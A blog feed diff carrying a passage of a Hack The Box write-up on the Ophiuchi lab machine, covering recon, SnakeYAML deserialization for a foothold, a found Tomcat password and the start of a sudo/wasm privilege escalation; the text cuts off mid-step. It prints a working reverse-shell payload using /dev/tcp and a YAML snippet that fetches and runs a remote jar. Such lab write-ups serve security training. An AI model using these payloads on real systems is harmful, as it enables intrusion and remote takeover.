@@ -1,4 +1,229 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2021-06-28T18:24:09+00:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">Ryan Kozak</title><subtitle>hacking, web development, $other</subtitle><author><name>Ryan Kozak</name></author><entry><title type="html">Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root…Again</title><link href="http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro-again/" rel="alternate" type="text/html" title="Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root…Again" /><published>2021-06-28T00:00:00+00:00</published><updated>2021-06-28T18:24:09+00:00</updated><id>http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro-again</id><content type="html" xml:base="http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro-again/">&lt;p&gt;In my &lt;a href=&quot;/luks-encrypted-arch-linux-on-pinebook-pro/&quot;&gt;previous post&lt;/a&gt; I went through the steps I used to install Arch Linux on my Pinebook Pro with a LUKS encrypted root partition. It appears that the repositories used in that post have been retired, and the packages hosted at &lt;em&gt;https://nhp.sh/pinebookpro/&lt;/em&gt; are no longer there. A big thanks to &lt;a href=&quot;https://github.com/nadiaholmquist&quot;&gt;Nadia Holmquist Pedersen&lt;/a&gt; for all the work she’s done for Arch on the Pinebook Pro.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2021-07-16T21:39:33+00:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">Ryan Kozak</title><subtitle>hacking, web development, $other</subtitle><author><name>Ryan Kozak</name></author><entry><title type="html">Hack The Box - Ophiuchi</title><link href="http://0.0.0.0:4000/hack-the-box-craft-ophiuchi/" rel="alternate" type="text/html" title="Hack The Box - Ophiuchi" /><published>2021-07-16T00:00:00+00:00</published><updated>2021-07-16T21:39:29+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-ophiuchi</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-craft-ophiuchi/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/badge.png&quot; alt=&quot;badge&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;Ophiuchi is a Medium box with a weird name to pronounce. The initial foothold was straight forward but fun, the user flag reminds us to go back to the basics, and the root flag is a difficult mind game for those of us that haven’t even been exposed to the technology.&lt;/p&gt;
+
+&lt;h1 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h1&gt;
+&lt;h2 id=&quot;port-scan-nmapautomator&quot;&gt;Port Scan: nmapAutomator&lt;/h2&gt;
+&lt;p&gt;We begin our reconnaissance by running &lt;em&gt;&lt;a href=&quot;https://github.com/21y4d/nmapAutomator&quot;&gt;nmapAutomator&lt;/a&gt;&lt;/em&gt; via &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo ./nmapAutomator.sh 10.10.10.227 All&lt;/code&gt;. Among many other things, this runs our port scans with increasing comprehensiveness.&lt;/p&gt;
+
+&lt;p&gt;Output of Basic nmap scan below.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Tools/nmapAutomator/10.10.10.227/nmap]
+└─$ cat Basic_10.10.10.227.nmap
+# Nmap 7.91 scan initiated Fri Jun 11 19:18:21 2021 as: nmap -Pn -sCV -p22,8080 -oN nmap/Basic_10.10.10.227.nmap --dns-server=1.1.1.1 10.10.10.227
+Nmap scan report for 10.10.10.227
+Host is up (0.34s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
+|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
+|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
+8080/tcp open  http    Apache Tomcat 9.0.38
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Parse YAML
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Jun 11 19:18:49 2021 -- 1 IP address (1 host up) scanned in 27.15 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The open ports on the machine are &lt;strong&gt;22&lt;/strong&gt; and &lt;strong&gt;8080&lt;/strong&gt;. These are all we’ll need to proceed through the rest of the box. Let’s take a look at what’s on the web port.&lt;/p&gt;
+
+&lt;h3 id=&quot;port-8080&quot;&gt;Port 8080&lt;/h3&gt;
+&lt;p&gt;Browsing to the website we can see that it’s a web application for parsing YAML.&lt;br /&gt;
+&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/parser.png&quot; alt=&quot;yaml_webapp&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Figure 1:&lt;/strong&gt; Online YAML parser&lt;/p&gt;
+
+&lt;p&gt;A quick search for “YAML parser vulnerability” leads us to “Snake YAML Deserilization” &lt;em&gt;&lt;a href=&quot;https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858&quot;&gt;1&lt;/a&gt;&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/yaml_google.png&quot; alt=&quot;yaml_google&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Figure 2:&lt;/strong&gt; Snake YAML Deserilization Exploit.&lt;/p&gt;
+
+&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;
+&lt;h2 id=&quot;initial-foothold&quot;&gt;Initial foothold&lt;/h2&gt;
+&lt;p&gt;The SnakeYAML deserilization attack is made easier with artsploit’s &lt;em&gt;&lt;a href=&quot;https://github.com/artsploit/yaml-payload&quot;&gt;yaml-payload Github repository&lt;/a&gt;&lt;/em&gt; and an additional payload for a reverse shell can be found in &lt;em&gt;&lt;a href=&quot;https://github.com/artsploit/yaml-payload/issues/3&quot;&gt;issue 3&lt;/a&gt;&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;First, we’ll clone the repository &lt;code class=&quot;highlighter-rouge&quot;&gt;git clone https://github.com/artsploit/yaml-payload.git&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/clone.png&quot; alt=&quot;clone_repo&quot; /&gt;
+&lt;strong&gt;Figure 3:&lt;/strong&gt; Clone yaml-payload repo.&lt;/p&gt;
+
+&lt;p&gt;We then navigate to &lt;code class=&quot;highlighter-rouge&quot;&gt;yaml-payload/src/artsploit&lt;/code&gt; and modify the &lt;code class=&quot;highlighter-rouge&quot;&gt;AwesomeScriptEngineFactory()&lt;/code&gt; method within &lt;code class=&quot;highlighter-rouge&quot;&gt;AwesomeScriptEngineFactory.java&lt;/code&gt;. The default payload pops open the calculator application on MacOS. The payloads that are posted in &lt;em&gt;&lt;a href=&quot;https://github.com/artsploit/yaml-payload/issues/3&quot;&gt;issue 3&lt;/a&gt;&lt;/em&gt; of this repo will call a reverse shell, so rather than recreating them, we’ll drop the first payload into &lt;code class=&quot;highlighter-rouge&quot;&gt;AwesomeScriptEngineFactory.java&lt;/code&gt; with our IP address as the callback.&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AwesomeScriptEngineFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.3/8081 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
+    &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;echo $jex&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/awesome_jar.png&quot; alt=&quot;awesome_jar&quot; /&gt;
+&lt;strong&gt;Figure 4:&lt;/strong&gt; Placing reverse shell payload into &lt;code class=&quot;highlighter-rouge&quot;&gt;AwesomeScriptEngineFactory.java&lt;/code&gt;’s &lt;code class=&quot;highlighter-rouge&quot;&gt;AwesomeScriptEngineFactory()&lt;/code&gt; method.&lt;/p&gt;
+
+&lt;p&gt;Now, as instructed by the repository, we’ll compile the &lt;code class=&quot;highlighter-rouge&quot;&gt;AwesomeScriptEngineFactory.java&lt;/code&gt; file and build our &lt;code class=&quot;highlighter-rouge&quot;&gt;yaml-payload.jar&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/build.png&quot; alt=&quot;build&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Figure 5:&lt;/strong&gt; Compiling Java exploit and building &lt;code class=&quot;highlighter-rouge&quot;&gt;yaml-payload.jar&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Since the snippet we’ll be placing into the web application will pull &lt;code class=&quot;highlighter-rouge&quot;&gt;yaml-payload.jar&lt;/code&gt; from a remote url, we’ll copy the payload to our apache directory and make sure the server is running.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/copy_server.png&quot; alt=&quot;copy_server&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Figure 6:&lt;/strong&gt; Copy &lt;code class=&quot;highlighter-rouge&quot;&gt;yaml-payload.jar&lt;/code&gt; to Apache’s directory and start the server.&lt;/p&gt;
+
+&lt;p&gt;By placing the snippet below into the YAML parser, we’ll download the payload we’ve just created and hosted, and execute it  on the victim machine (we must first not forget to start our netcat listener on port 8081)&lt;/p&gt;
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;javax&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ScriptEngineManager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;URLClassLoader&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://10.10.14.3/yaml-payload.jar&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/execute_foothold.png&quot; alt=&quot;execute_foothold&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Figure 7:&lt;/strong&gt; Snippet placed in web application.&lt;/p&gt;
+
+&lt;p&gt;Once we click “parse” the payload is executed and our shell is obtained.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/foothold.png&quot; alt=&quot;foothold&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Figure 8:&lt;/strong&gt; Reverse shell as tomcat user.&lt;/p&gt;
+
+&lt;h2 id=&quot;user-flag&quot;&gt;User Flag&lt;/h2&gt;
+&lt;p&gt;Moving from the initial foothold to the user flag on this machine is fairly simple. After some manual enumeration we’ll find that &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/tomcat/conf/tomcat-users.xml&lt;/code&gt; contains a password &lt;code class=&quot;highlighter-rouge&quot;&gt;whereisalimit&lt;/code&gt; for the &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; user.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/users_xml.png&quot; alt=&quot;users_xml&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Figure 9:&lt;/strong&gt; The &lt;code class=&quot;highlighter-rouge&quot;&gt;tomcat-users.xml&lt;/code&gt; file containing credentials for &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; user.&lt;/p&gt;
+
+&lt;p&gt;To login as the &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; user, we’ll first use the old &lt;code class=&quot;highlighter-rouge&quot;&gt;python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/code&gt; trick to get an interactive shell, and then simply &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; with the credentials we’ve found.&lt;br /&gt;
+&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/user.png&quot; alt=&quot;users&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Figure 10:&lt;/strong&gt; The flag for the &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; user.&lt;/p&gt;
+
+&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;
+&lt;p&gt;Running &lt;em&gt;&lt;a href=&quot;https://github.com/diego-treitos/linux-smart-enumeration&quot;&gt;lse.sh&lt;/a&gt;&lt;/em&gt; reveals that we’re able to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/wasm-functions/index.go&lt;/code&gt; via sudo without a password.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[!] sud010 Can we list sudo commands without a password?................... yes!
+---
+Matching Defaults entries for admin on ophiuchi:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User admin may run the following commands on ophiuchi:
+    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
+---
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When we examine the &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/wasm-functions/index.go&lt;/code&gt; file, we can see that it reads &lt;code class=&quot;highlighter-rouge&quot;&gt;main.wasm&lt;/code&gt; without a path, and calls &lt;code class=&quot;highlighter-rouge&quot;&gt;deploy.sh&lt;/code&gt; without a path. If a variable &lt;code class=&quot;highlighter-rouge&quot;&gt;f&lt;/code&gt; is set equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;wasm&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;github.com/wasmerio/wasmer-go/wasmer&quot;&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;os/exec&quot;&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;log&quot;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wasm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;main.wasm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+        &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wasm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NewInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;defer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;init&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;info&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Not ready to deploy&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Ready to deploy&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;deploy.sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Fatal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If we’re able to control this &lt;code class=&quot;highlighter-rouge&quot;&gt;f&lt;/code&gt; variable, then we can create our own &lt;code class=&quot;highlighter-rouge&quot;&gt;deploy.sh&lt;/code&gt; script to be executed in another directory (presumable to gain us a reverse shell as root).&lt;/p&gt;
+
+&lt;p&gt;To decompile &lt;code class=&quot;highlighter-rouge&quot;&gt;main.wasm&lt;/code&gt; into a human readable &lt;code class=&quot;highlighter-rouge&quot;&gt;.wat&lt;/code&gt; file, we can use the following &lt;em&gt;&lt;a href=&quot;https://github.com/WebAssembly/wabt.git&quot;&gt;https://github.com/WebAssembly/wabt.git&lt;/a&gt;&lt;/em&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Tools]
+└─$ git clone https://github.com/WebAssembly/wabt.git            
+Cloning into 'wabt'...
+remote: Enumerating objects: 29666, done.
+remote: Counting objects: 100% (93/93), done.
+remote: Compressing objects: 100% (72/72), done.
+remote: Total 29666 (delta 37), reused 35 (delta 21), pack-reused 29573
